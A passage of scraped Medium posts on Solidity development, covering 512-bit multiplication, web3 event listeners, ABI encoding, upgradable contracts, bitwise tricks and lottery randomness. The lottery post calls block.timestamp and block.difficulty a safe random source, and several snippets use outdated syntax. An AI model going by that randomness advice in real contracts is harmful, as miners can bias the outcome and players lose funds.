This is not bad, but the gas cost is almost two orders of magnitude larger than the 5 gas for a regular multiplication, or 90 for a standard safeMul.We can do a lot better.Chinese RemainderSo here\u2019s the trick: We use the rather obscure mulmod instruction and the Chinese Remainder Theorem. In short, the theorem states thati f we know a number modulo 2\u00b2\u2075\u2076 and 2\u00b2\u2075\u2076\u200a\u2014\u200a1, we can compute its 512-bit representation cheaply. The function to do this, chineseRemainder, is described in a previous post. To use it here, we first need to compute our product in the two moduli:The first one, x\u2080 is just a regular multiply, as it already truncates to 256 bits. The second one, x\u2081, can be computed directly using a single mulmod operation. This is a rather unknown opcode that computes:Put this together, and we have our new mul512 function:512-bit multiplication.The Solidity compiler, as of version 0.4.18, does not produce very optimal code here. The chineseRemainder function is so tiny it is not worth the call-overhead, so it should be inlined, but the compiler doesn\u2019t do this. The compiler does recognize that M1 can be expressed efficiently as not(0). Manually inlining results in an efficient multiplication function:Optimized full 512 bit multiplication in Solidity.It is our chineseRemainder function (two subs and one lt) with a mul and mulmod added. We use assembly to avoid an unnecessary branch. The total gas cost is about 60 gas, compared to 5 for a normal multiply and 90 for a standard safeMul. In fact, it is slightly cheaper to use mul512 and check that r1 is zero than it is to use safeMul!ConclusionIt is possible to do full precision never-overflowing multiplication in the EVM for less gas than a regular safeMul. This is a good starting point for smart contracts do not want to reject transaction just because an intermediate value overflows.", "responses": "1"}, {"title": "Watching Solidity Events\u200a\u2014\u200athe right\u00a0way", "author_name": "Raghav Dua", "link": "https://medium.com/@theMadKing/watching-solidity-events-the-right-way-d3d0a30bdc4d?source=search_post", "post_date": "Jul 21, 2016", "readtime": "3 min read", "upvotes": "371", "content": "Watching Solidity Events\u200a\u2014\u200athe right\u00a0wayThis post is meant for solidity noobs (like me) who have recently started dabbling with ethereum dapp development & the blockchain technology.Raghav DuaBlockedUnblockFollowFollowingJul 21, 2016I\u2019ve had a hard time following Solidity tutorials and its official documentation. Some snippets are simply not up-to-date, especially the web3 API. Those few things can be really frustrating to figure out on your own, and I\u2019ve taken great pains to figure out the actual web3 API usage rather than what\u2019s described in the doc, and I\u2019d like to share them. This is the first post in the series and also my first blog, hopefully you will not be so disappointed =)ps- you can also read the same on my repositoryEvents help clients keep track of a particular occurrence\u200a\u2014\u200athe closing of an Auction, for example. So let\u2019s explore how to create events, emit them and establish a mechanism that notifies us upon firing of the particular eventWe\u2019ll start with a very basic Auction Contract. The end result will load an HTML document which notifies that the call to close the auction will be made after 3 seconds. When the auction is closed, an event is triggered, notifying web3 of the closing, which in turn notifies our listener, whose code changes the text to \u201cAuction closed\u201d.Below are the 3 truffle files (the entire truffle project will soon be available under the \u201cproject\u201d directory):index.html<!DOCTYPE html><html><head>  <title>MetaCoin - Default Truffle App</title>  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>  <link href=\"./app.css\" rel='stylesheet' type='text/css'>  <script src=\"./app.js\"></script></head><body>  <div id = \"status\">Closing Auction in 3 seconds...</div></body></html>Auction.solcontract Auction {  event AuctionClosed (uint highestBid);  //declare eventto be triggered when Auction closes  address public creator;  function Auction () { //Auction Constructor to register the creator of the contract    creator = msg.sender;  }  function closeAuction (uint someRandomBid) {    if (msg.sender == creator) {  //make sure that auction is being ended by the creator themselves      AuctionClosed (someRandomBid);  //trigger the event to notify the listeneres that the auction has ended      return;    }    throw;  }}(NOTE: For production-quality code, you\u2019re better off using security-audited libraries like Zeppelin\u2019s and a security-focused linter like Ethlint)app.jswindow.onload = function () {  let accounts = web3.eth.accounts; //create local variable for easy access  let maxBid = Math.ceil (Math.random () * 1000); //the maximum bid placed by the end of the auction  let status = document.getElementById ('status');  Auction.new ({from: accounts [0]}) //create new contract object    .then ( (contract) => {      contract.AuctionClosed ().watch ( (err, response) => {  //set up listener for the AuctionClosed Event        //once the event has been detected, take actions as desired        status.innerHTML = 'The auction has ended! Highest Bid is ' + response.args.highestBid;      });      setTimeout ( () => {  //simulate an auction for 3 seconds, after which the creator closes the auction        contract.closeAuction (maxBid, {from: accounts [0]});      }, 3000);    })    .catch ( (err) => {      status.innerHTML = 'Some error occured. I guess shit happens =(';    });};The main thing in our Solidity contract is the declaration and triggering of the AuctionClosed event. The main thing in app.js is the right way to use the web3 API to listen for events and act upon them as and when they occur.Now, fire up 2 terminals. In the first one, launch the testrpc utility to simulate the ethereum blockchain:testrpcIn the second terminal, navigate to the root directory of this project, then:truffle compiletruffle serveThen open up your browser and launch http://localhost:8080/ (if you haven\u2019t messed around with any of the default settings), wait for 3 seconds and BAM! You will see the highest bid (randomly generated, duh).NOTE: There is no gas involved in this because testrpc is basically a simulation.That\u2019s all folks. Would love to hear your feedback on this =)If you liked it, share it with your friends so they too can learn something new. If you hated it, share it with your friends so they too suffer through this piece of crap tut!", "responses": "7"}, {"title": "What are ABI encoding functions in Solidity\u00a00.4.24?", "author_name": "libertylocked", "link": "https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8?source=search_post", "post_date": "Jun 18, 2018", "readtime": "3 min read", "upvotes": "536", "content": "What are ABI encoding functions in Solidity\u00a00.4.24?libertylockedBlockedUnblockFollowFollowingJun 18, 2018Solidity 0.4.24 added a bunch of ABI encoding functions. Copied from Solidity docs, they are\u2026abi.encode(...) returns (bytes): ABI-encodes the given argumentsabi.encodePacked(...) returns (bytes): Performes packed encoding of the given argumentsabi.encodeWithSelector(bytes4 selector,\u00a0...) returns (bytes): ABI-encodes the given arguments starting from the second and prepends the given four-byte selectorabi.encodeWithSignature(string signature,\u00a0...) returns (bytes): Equivalent to abi.encodeWithSelector(bytes4(keccak256(signature),\u00a0...)Really the interesting functions here are encode and encodePacked, since the other 2 kind of just calls encodeThose functions are useful if you call functions dynamically.abi.encodeStarting with a simple example. If you just encode a single string like,abi.encode(\"AAAA\");You get the following output (96 bytes, 3 words)0x00000000000000000000000000000000000000000000000000000000000000200x00000000000000000000000000000000000000000000000000000000000000040x4141414100000000000000000000000000000000000000000000000000000000The 1st word is 0x20 (32 in decimal) padded to 32 bytes. This indicates the starting offset of the first and only parameter.The 2nd word is 0x04 padded to 32 bytes. This indicates the length of our string.Finally the 3rd word is our data, \u201cAAAA\u201d, UTF-8 encoded, padded to 32 bytes.Now let\u2019s try encoding two strings,abi.encode(\"AAAA\", \"BBBB\");It produces the following output (192 bytes, 6 words)0x00000000000000000000000000000000000000000000000000000000000000400x00000000000000000000000000000000000000000000000000000000000000800x00000000000000000000000000000000000000000000000000000000000000040x41414141000000000000000000000000000000000000000000000000000000000x00000000000000000000000000000000000000000000000000000000000000040x4242424200000000000000000000000000000000000000000000000000000000The 1st word is 0x40 (64 in decimal), indicating the starting offset of the first parameter.The 2nd word is 0x80 (128 in decimal), indicating the starting offset of the second parameter.The 3rd word is 0x04, which is the length of the first string.The 4th word is \u201cAAAA\u201dThe 5th word is 0x04, which is the length of the second string.The last word is \u201cBBBB\u201dYou can even go fancier and encode some arrays.uint8[3] memory arr = [0x1, 0x2, 0x42];abi.encode(arr, \"AAAA\", \"BBBB\");The result is 9 words.0x00000000000000000000000000000000000000000000000000000000000000010x00000000000000000000000000000000000000000000000000000000000000020x00000000000000000000000000000000000000000000000000000000000000420x00000000000000000000000000000000000000000000000000000000000000a00x00000000000000000000000000000000000000000000000000000000000000e00x00000000000000000000000000000000000000000000000000000000000000040x41414141000000000000000000000000000000000000000000000000000000000x00000000000000000000000000000000000000000000000000000000000000040x4242424200000000000000000000000000000000000000000000000000000000Because the array is fixed-length, The 3 elements in the array are simply laid out in the first 3 words.The 4th word is the offset for \u201cAAAA\u201d (160 in decimal, meaning the start of the data is at the 6th word)The 5th word is the offset for \u201cBBBB\u201d (224 in decimal, meaning the start of the data is at the 8th word)The 6th word is the length of \u201cAAAA\u201dThe 7th word is \u201cAAAA\u201dThe 8th word is the length of \u201cBBBB\u201dThe 9th word is \u201cBBBB\u201dabi.encodePackedEncode packed is simpler (although non-standard) than encode. Dynamic types are encoded in-place without length. Static types will not be padded if they are shorter than 32 bytes.Packed encode a single stringabi.encodePacked(\"AAAA\");Simply produces 0x41414141, which is exactly the same as just simply converting it to bytes.Encoding some uint with stringabi.encodePacked(uint8(0x42), uint256(0x1337), \"AAAA\", \"BBBB\");The output is0x420x00000000000000000000000000000000000000000000000000000000000013370x414141410x42424242Interestingly, arrays don\u2019t necessarily have their elements packed.uint8[3] memory arr = [0x1, 0x2, 0x42];abi.encodePacked(arr, \"AAAA\", \"BBBB\");The output is0x00000000000000000000000000000000000000000000000000000000000000010x00000000000000000000000000000000000000000000000000000000000000020x00000000000000000000000000000000000000000000000000000000000000420x414141410x42424242So the uint8 array elements are still padded to 32-byte words.keccak256 encoding\u00a0behaviorBefore ABI encoding functions were introduced, keccak function accepts multiple arguments likekeccak256(\"AAAA\", \"BBBB\", 42);It has been implicitly doing encodePacked. But now if you try calling keccak with those, you are likely to get a compiler warning.This function only accepts a single \"bytes\" argumentSo it is no longer recommended to let compiler work its magic and implicitly encode the parameters to bytes. It gives the programmer more control of how the data should be encoded, packed or not.If you want the same behavior as before, you can try encodePacked, or convert the data to bytes yourself. For string, it can be directly converted to bytes like bytes(myString). For anything else, explicit packing may be needed.", "responses": "1"}, {"title": "Upgradable Contracts in\u00a0Solidity", "author_name": "Hassan Abdel-Rahman", "link": "https://medium.com/cardstack/upgradable-contracts-in-solidity-d5af87f0f913?source=search_post", "post_date": "Jan 19, 2018", "readtime": "8 min read", "upvotes": "847", "content": "Upgradable Contracts in\u00a0SoliditySolving the riddle of how to improve immutable Ethereum\u00a0codeHassan Abdel-RahmanBlockedUnblockFollowFollowingJan 19, 2018At Cardstack we are building an application framework that will enable developers to create and host dApps that put user experience first. As part of this effort we\u2019re creating an extensible and future-proof token to power our framework. Enter: Upgradable Contracts.So why are upgradable contracts important? Requirements change, the market changes, the world becomes more complex, entropy increases\u200a\u2014\u200asoftware, much like biology, is in a constant state of flux. The most successful software is the software that adapts best to a changing world. A smart contract isn\u2019t so smart if it can\u2019t evolve over time.We\u2019ve found a way to solve this crucial problem.The core of the approach that we have taken at Cardstack was greatly influenced by Elena Dimitrova\u2019s blog post on how Colony builds upgradable contracts. Specifically, the most important thing to consider when upgrading contracts is how to preserve the state of the original contract in the upgraded contract. In a classic software engineering approach, Elena describes how the state of the contract can be separated from the functionality of the contract. This approach allows multiple contracts to share the same state.When we built upon this approach, we added an additional component to the solution: a \u201cregistry contract\u201d. The registry contract performs the bookkeeping necessary to keep track of the shared contract state, keep track of the different versions of each contract, and to bind and unbind the shared state to contracts as new versions of the contracts are added to the network. Furthermore, the registry contract acts as a bridge between the Ethereum Name Service (ENS) and the latest version of our contracts.StorageFirst, let\u2019s talk a little more about how we are handling the contract state. As in the approach described in Elena\u2019s post, we have created a \u201cstorage contract\u201d that basically acts a bucket, carrying the state from one version of our contract to the next. In this storage contract, we can accommodate many different types of data in a name-value store. We have also created a \u201cledger contract\u201d, as in the Colony approach, a specialized form of a storage contract designed specifically for ledgers. However, in our storage contract we\u2019ve created a map of ledgers you can use in place of the \u201cledger contract\u201d, which we\u2019ll most likely end up doing in the future.ExternalStorage.solThe ExternalStorage.sol is our \u201cstorage contract\u201d. In it you can see we provide slots for storing all types of data, including more complex structures like actual ledgers, and even \u201cmulti-ledgers\u201d (a word I just invented), which is a map of ledgers. This is what we use to store the allowances for the transferFrom() ERC20 function of our contract. For each type, we have a record parameter which is the \u201ckey\u201d in our storage contract\u2019s key value store. In our token\u2019s library contract you can see how we set and get these values from our storage:snippet from CstLibrary.solAnother interesting thing to note: we\u2019ve done some extra work in our storage contract to allow our ledgers (and multi-ledgers) to be iterate-able so that our storage is more easily introspected. It does cost additional gas to maintain such structures; but for our specific use-cases, we felt the additional gas fees were worth the trade-off.For completeness, the specialized form of our ledger storage appears below:CstLedger.solYou can see how we use our ledger storage in our main ERC20 token contract. Below are an example of a few of the ERC20 functions that leverage the ledger-specific storage:Snippet from CardstackToken.solRegistryThe next component of our upgradable approach is the registry. The registry creates a nice abstraction over the actual Ethereum addresses for the contracts that participate in our ecosystem. The idea is that we only need to know the \u201cname\u201d of a contract, and query the registry for the most recent version of the contract that has a particular name. In addition, contracts that need to use the shared storage do not need to know the address of the shared storage; rather, they can declare to the registry their interest in using a particular bucket of storage (which also has a name), and the registry will take care of binding the storage to the contract that declared interest in using it. So at a real high-level, the registry is doing the work of keeping track of the addresses of all the contracts in our system and mapping the names of contracts to the addresses of contracts.registry.addStorage()After the storage contract is deployed we add it to the registry and give the storage contract a name by calling registry.addStorage(). From this point forward, when contracts are registered with the registry they can declare their intent to use the storage by name. The registry is then responsible for resolving the storage name to a specific address, as well as granting the contract \u201cpermissions\u201d to use the storage (more on this later).registry.registerContract()For contracts that participate in our ecosystem that are not storage contracts, e.g. our token contract, we use registry.registerContract() to add them to our registry. Our contracts implement a storable.sol interface, which has the following declaration:storable.solAs you may see, the ledger name and storage name used by the token contract are specified in the constructor of our token contract and then just returned in the storable.sol functions. Additionally, our token contract implements a configurable.sol interface, which declares a configureFromStorage() function. In this function we the registry to resolve the storage names to actual addresses:CardstackToken.sol (snippet)And at this point we have a token contract that is bound to the storage contract(s) for which it is has declared an interest.So a quick recap:We add storage to the registry and assign the storage a name.We create contracts (in this case a token contract) that declare an interest in using storage with a specific name.We register a contract with the registry, which then resolves the names of the storage to specific Ethereum addresses within the contract being registered.upgradeContract()The ability to upgrade a contract is exposed in the upgradeContract() function. This function\u2019s parameters are the name of the contract and the address of the \u201csuccessor\u201d contract (where the current contract becomes the predecessor contract). The registry will use the same mechanism that was leveraged in the registration of the predecessor contract to discover the storage that the successor contract has declared it is interested in using. The registry resolves the address for the storage in the successor contract and binds the storage within the successor contract using configureFromStorage().During the upgrade operation, the permissions of the predecessor contract upon the storage is revoked, so that the predecessor contract can no longer manipulate the storage. Likewise, the permissions of the successor contract upon the storage is granted, so that the successor contract can manipulate the storage. Additionally, the modifier unlessUpgraded will prevent the predecessor contract\u2019s functions from executing, and instead cause them to revert. The predecessor contract also acquires a property that points to the successor contract as result of the registry upgrading the contract, so the clients of the contract can discover the new address of the upgraded contract (the successor contract). Finally a ContractUpgraded event is emitted when the contract upgrades (as well as an AddrChanged event for EIP-137 ENS resolver support\u200a\u2014\u200amore on that later).But what about \u201cpermissions\u201d?So I mentioned the word \u201cpermissions\u201d a few times in this post\u200a\u2014\u200awhat do I mean by that? The Cardstack contracts have the ability to designate addresses from which msg.send calls can invoke privileged functions. In addition, we have devised two different levels (as of the time of this writing) of privileged access (most likely there will be many more, and we\u2019ll probably want to further generalize this solution as time goes on). The lower level role of privileged access is what I\u2019m calling an \u201cadmin\u201d, and the higher level role of privileged access is what I\u2019m calling a \u201csuper admin\u201d. Generally admins have the ability to modify storage, while super admins have the ability to create admins, register contracts, and upgrade contracts.We use a administratable.sol base contract that supplies the ability to add and remove admins and super admins as well as modifiers to designate that functions are only able to be invoked by admins and super admins, or more restrictively, just super admins. Additionally, we use iterate-able maps so that we can easily introspect our administrative addresses.administrable.solFor reference the full Registry.sol appears below which shows how storage is added, how contracts are registered, and how contracts are upgraded:Registry.sol", "responses": "2"}, {"title": "Bitwise Operations and Bit Manipulation in Solidity, Ethereum", "author_name": "Maksym", "link": "https://medium.com/@imolfar/bitwise-operations-and-bit-manipulation-in-solidity-ethereum-1751f3d2e216?source=search_post", "post_date": "Oct 27, 2016", "readtime": "6 min read", "upvotes": "336", "content": "Bitwise Operations and Bit Manipulation in Solidity, EthereumMaksymBlockedUnblockFollowFollowingOct 27, 2016Yes, Ethereum is the world\u2019s computer, though probably the most expensive one. Since storage is the largest gas-consuming operation, occasionally it is reasonable to dig down to the level of bits. Same as Assembly coder would do while programming firmware of a microchip. This will allow to get more control over your data and ultimately reduce transaction cost.Smart contract language Solidity supports basic bitwise operations, though some of them are missing (like left/right shift). Luckily there\u2019s arithmetic equivalents.The purpose of the article is to give you fundamental primitives for bit manipulation which can be used in more complex constructions.All bitwise operations are executed bit by bit, same way you would compare elements of two different arrays at the same index. Note: 0 and 1 have the same meaning as false and true and vice-versa.For simplicity I\u2019ll gonna use bytes1 data type (equal to byte), though same will apply to larger datatypes. Lets use same a and b variables for all examples:We use hex representation to initialize them in Solidity:bytes1 a = 0xb5; //  [10110101]bytes1 b = 0x56; //  [01010110]ANDBoth bits must be 1s to result in true.(Inputs have white background and result is highlighted by yellow one)a & b; // Result: 0x14  [00010100]ORAt least one of the bits have to be 1 (true).a | b; // Result: 0xf7  [11110111]XORCan be described as a difference between two inputs. One of the inputs have to be 1 and the other one must be 0 to result in true. Simply a[i]\u00a0!= b[i]. XOR operation often applied in cryptographic algorithms.a ^ b; // Result: 0xe3  [11100011]Interesting property is that if you want to know what was the value of original b, just XOR result with a. In one sense a is the key to unlock b.0xe3 ^ a; // Result: 0x56 == b  [01010110]NegationNegation, an inversion operation usually associated with the character \u201c~\u201d. Zero becomes one, one becomes zero.Solidity doesn\u2019t have support for negate operation. Luckily negation is the same as to XOR input with all 1s.a ^ 0xff; // Result: 0x4a  [01001010]Bit ShiftSince there\u2019s no bit shift functionality in Solidity we can use arithmetics to do the same thing. I\u2019m going to use decimal number to show the concept.What shift basically means is that I want to move some digits N positions to the left or to the right.Take for example 1230 (zeros prefixed for illustration purposes):00001230If we want to shift this number to the left by 3 positions we expect result to be:01230000Which in other words just means to multiply by 10, 3 times (10\u00b3).And if we want to shift to the right by 4 positions it\u2019s the same as to divide 4 times by 10 (10\u2074):00000123Same applies to binary, though instead of 10 digits (0 \u2013 9) there\u2019s only 2 (0, 1). Henceforth we multiply or divide by 2.Note: If you need to manipulate more than bytes32 at a time, slight modifications are necessary to use shift operations.Left ShiftShift a 3 bits leftvar n = 3; var aInt = uint8(a); // Converting bytes1 into 8 bit integervar shifted = aInt * 2 ** n;bytes1(shifted);     // Back to bytes. Result: 0xa8  [10101000]Right ShiftShift a 2 bits rightvar n = 2; var aInt = uint8(a); // Converting bytes1 into 8 bit integervar shifted = aInt / 2 ** n;bytes1(shifted);     // Back to bytes. Result: 0x2d  [00101101]Get First N\u00a0BitsWe can create a mask of needed count of 1s in order to filter the part we\u2019re looking for by applying AND operation. For first 5 bits:var n = 5;var nOnes = bytes1(2 ** n - 1); // Creates 5 1svar mask = shiftLeft(nOnes, 8 - n); // Shift left by 3 positionsa & mask; // Result: 0xb0  [10110000]Note: var nOnes = 0xff; will work the same wayGet Last N\u00a0BitsThere\u2019s arithmetic way to get last N bits. We can achieve that using modulo. For example if want to get last 2 digits from 10345, we can easily do it by dividing by 100 (10\u00b2) and getting remainder.10345 % 10 ** 2 = 45Same with binary, though this time we\u2019re getting modulo of multiples of 2. For example to get last 5 bits:var n = 5;var lastBits = uint8(a) % 2 ** n;bytes1(lastBits); // Result: 0x15  [00010101]Data Packing Use\u00a0CaseLets say you have two 4-bit values c and d that you want to pack into one 8-bit value.Here\u2019s how you can do it:bytes1 c = 0x0d;bytes1 d = 0x07;var result = shiftLeft(c, 4) | d; // 0xd7 [11010111]c takes first 4 bits and d takes remaining 4 bits, can be other way around.Primitives Source\u00a0Codecontract BitsAndPieces {        function and(bytes1 a, bytes1 b) returns (bytes1) {        return a & b;    }        function or(bytes1 a, bytes1 b) returns (bytes1) {        return a | b;    }        function xor(bytes1 a, bytes1 b) returns (bytes1) {        return a ^ b;    }        function negate(bytes1 a) returns (bytes1) {        return a ^ allOnes();    }        function shiftLeft(bytes1 a, uint8 n) returns (bytes1) {        var shifted = uint8(a) * 2 ** n;        return bytes1(shifted);    }        function shiftRight(bytes1 a, uint8 n) returns (bytes1) {        var shifted = uint8(a) / 2 ** n;        return bytes1(shifted);    }        function getFirstN(bytes1 a, uint8 n) returns (bytes1) {        var nOnes = bytes1(2 ** n - 1);        var mask = shiftLeft(nOnes, 8 - n); // Total 8 bits        return a & mask;    }         function getLastN(bytes1 a, uint8 n) returns (bytes1) {        var lastN = uint8(a) % 2 ** n;        return bytes1(lastN);    }         // Sets all bits to 1    function allOnes() returns (bytes1) {        return bytes1(-1); // 0 - 1, since data type is unsigned, this results in all 1s.    }        // Get bit value at position    function getBit(bytes1 a, uint8 n) returns (bool) {        return a & shiftLeft(0x01, n) != 0;    }        // Set bit value at position    function setBit(bytes1 a, uint8 n) returns (bytes1) {        return a | shiftLeft(0x01, n);    }        // Set the bit into state \"false\"    function clearBit(bytes1 a, uint8 n) returns (bytes1) {        bytes1 mask = negate(shiftLeft(0x01, n));        return a & mask;    }    }", "responses": "2"}, {"title": "Lottery Smart Contract: Can we generate random numbers in Solidity?", "author_name": "Narek Hovsepyan", "link": "https://medium.com/@promentol/lottery-smart-contract-can-we-generate-random-numbers-in-solidity-4f586a152b27?source=search_post", "post_date": "Feb 10, 2018", "readtime": "5 min read", "upvotes": "327", "content": "Lottery Smart Contract: Can we generate random numbers in Solidity?Narek HovsepyanBlockedUnblockFollowFollowingFeb 10, 2018Imagine we are building a decentralized Lottery. What challanges does it have? Ever thought about is that even possible? In this article we are going to explore the possibile approaches for building a Smart Contract for decentralized lottery.History of\u00a0Lottery.The earliest mention of lottery games is in China, during Han dynasty, a game called keno, which you can still find in many Casinos in Asia. The idea of the lottery is simple. The organizer is collecting the money from players, and a randomly selected subset of players, called winners, are getting rewarded, while others are loosing their money. The organizer usually is distributing one part of all collected money, which is putting him on always profiting position. French King Francis I used lottery to get money to state budget and help state budget. Countries like Thailand or Russia, are allowing only state issued lotteries, while other countries like Goergia you can register lottery company within minutes.What is\u00a0Lottery?Well, everybody knows what is lottery. At least if you are reading this articles, you know what is lottery. I am asking to question, to go further and define the task we will solve in this article.Design a Smart Contract, which accept a single number from users, after getting payed for 0.1 eth, add a pool of users. At some point stop allowing submissions of new user, then select a random number, distribute half of collected funds between users, who have submitted the selected number.Why It is difficult?Here are two challanges we will face in order to develop Smart Contract for a lottery.How we will generate random number? In Solidity, the code should be deterministic, as it will run on multiple nodes. Things like clock time are not available for generating random number.How does Smart Contract know the time for selecting the winner? Again things like clock time are not available in Ethereum Virtual Machine, as the code will be ran on multiple nodes, on different time.The second challange can be solved using Ethereum Alarm. The blocknumber can be an alternative in a clock time, as it is always increasing by 1. As I want to focus on the first challage, in our smart contract We will make a public function which will trigger the winner(s) selection process. This can be triggered either by owner of smart contract, or by Ethereum alarm, or in any other way.Generating (Pseudo)Random number in\u00a0SolidityWe need a random number generator, which will generate the same number on multiple nodes, running multiple times. This is nonsense for anyone who knows what means random number. Then how we can accomplish that task? We need a random number generated once, and use that on different nodes. Well Solidity code will ran the code on multiple nodes, multiple times, but there is one running process which makes it unique among all the runs of the code. Yes it is the time when the code will be ran by miner, who will confirm the transaction. Let\u2019s take a look to the block variable\u00a0, which is assigned by miner to every confirmed smart contract. If we will look to block.timestamp constant, it is assigned by miner, no player have control on it. After it will be generated and assigned, it will be the same for all other nodes which will ran the Solidity code. block.difficulty also has some properties of randomness. Basically those two variables are completely out of control of the players, thus they can be used as a source for random number. They are generated only once by miner, and on all other nodes it will have the same value, thus random number will be generated on multiple nodes will be the same.Sounds legit enough right? let\u2019s look the Solidity code snippet for a lottery, everything should be self explaining. Note that in this code I have ignored gas limits, as this code is for demonstration of random number generation only.random() function is determined block\u2019s parametersLet\u2019s explain the random() function. It depends on block.difficulty and block.timestamp, it is being hashed and encoded as a number. After encoding 256 bit hash to 256 bit integer, we are taking reminder by dividing 251, to get an integer in a range from [0, 250]. In our case 251 is prime number, whic is good. You are free to use any hash function Solidity is providing. But Why Hashing? All you need is just an operation which will convert given constants into fixed length bits. Hashing is not important here, as it is only incapsulating initial values, which is not giving us anything, as initial values they are available for any blockchain explorer.", "responses": "4"}]